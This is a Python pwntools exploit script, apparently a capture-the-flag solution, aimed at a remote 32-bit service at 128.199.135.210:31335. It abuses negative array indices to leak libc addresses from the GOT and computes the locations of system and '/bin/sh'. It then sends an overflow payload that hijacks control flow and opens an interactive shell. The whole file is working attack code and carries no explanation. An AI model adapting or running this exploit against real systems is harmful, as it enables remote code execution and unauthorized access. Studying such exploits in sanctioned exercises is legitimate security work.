
from pwn import *

exit = 0x0804B01C
array = 0x0804B060
leakaddr = 0x080488CE
read = 0x08048430
libc = ELF('libc6_2.24-3ubuntu2.2_i386.so')
r = remote('128.199.135.210', 31335)
# libc = ELF('/usr/lib/libc.so')
# r = process('./bit')
r.recvuntil(':')
r.sendline('chung')
r.recvuntil(':')
r.sendline('-65536')
r.recvuntil('?')
r.sendline('120')
r.recvline()
for i in range(120):
	r.sendline(str(0))
r.sendline('-38')
txt = r.recvline_startswith('0x')
print txt
leak = int('0'+txt[2:],16)
print leak
r.sendline('-20')
txt = r.recvline_startswith('0x')
print "print: "+txt
r.sendline('-18')
txt = r.recvline_startswith('0x')
print "puts: "+txt
r.sendline('-14')
txt = r.recvline_startswith('0x')
setbuf = int('0'+txt[2:],16)
print "setvbuf: %s" %hex(setbuf)
r.sendline('-13')
txt = r.recvline_startswith('0x')
scanf = int('0'+txt[2:],16)
print "__isoc99_scanf: %s" %hex(scanf)
baseaddr = scanf - libc.symbols['__isoc99_scanf']
print "base addr: %s" %hex(baseaddr)
system = baseaddr + libc.symbols['system']
sh = baseaddr + next(libc.search('/bin/sh\x00'))
print "system: %s" %hex(system)
print "sh: %s" %hex(sh)
r.sendline('-1')
r.recvuntil('find')
r.sendline(str(leak))
print r.recvuntil('!!!\n')
for i in range(25):
	r.recvuntil('?')
	r.sendline('n')
print r.recvuntil('?')
r.sendline('y')
print r.recvuntil('value')
r.sendline(str(leakaddr))
r.recvuntil('?')
r.sendline('y')
r.recvuntil('value')
r.sendline('q'*0x15+'a'*4+p32(system)+p32(sh)*2)
r.interactive()

